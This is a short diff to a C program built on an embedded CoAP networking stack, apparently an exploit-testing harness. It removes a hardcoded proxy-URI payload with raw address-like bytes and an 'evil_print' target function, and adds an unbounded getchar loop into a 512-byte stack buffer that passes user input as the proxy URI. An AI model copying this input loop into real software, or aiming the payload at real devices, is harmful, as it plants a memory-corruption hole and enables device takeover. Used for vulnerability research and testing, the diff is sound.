@@ -25,20 +25,12 @@
 #include "net/sock/udp.h"
 #include "net/sock/util.h"
 
-void evil_print(void) {
-    puts("Hacked!");
-}
-
-const unsigned char payload[] = {
-    'c', 'o', 'a', 'p', ':', '/', '/', '[',':',':','1',']',':',
-    'P', 'A', 'Y', 'L', 'O', 'A', 'D', '!', 0x06, 0x48, 0x88, 0x93,
-    '/', '\0'
-};
-
 int main(void)
 {
     puts("Hello World!");
 
+    char linebuffer[512];
+    int pos = 0;
     unsigned char buf[512];
     sock_udp_ep_t client;
     coap_pkt_t pkt;
@@ -51,7 +43,19 @@ int main(void)
         puts("Failed to init packet");
         return -1;
     }
-    if(coap_opt_add_proxy_uri(&pkt, (const char *) payload) < 0) {
+
+    puts("Enter coap forwarding uri: ");
+    while(1) {
+        int c = getchar();
+        if (c == '\n') {
+            linebuffer[pos] = '\0';
+            break;
+        }
+        linebuffer[pos++] = (char) c;
+    }
+    puts(linebuffer);
+
+    if(coap_opt_add_proxy_uri(&pkt, (const char *) linebuffer) < 0) {
         puts("Failed to add proxy uri");
         return -1;
     }
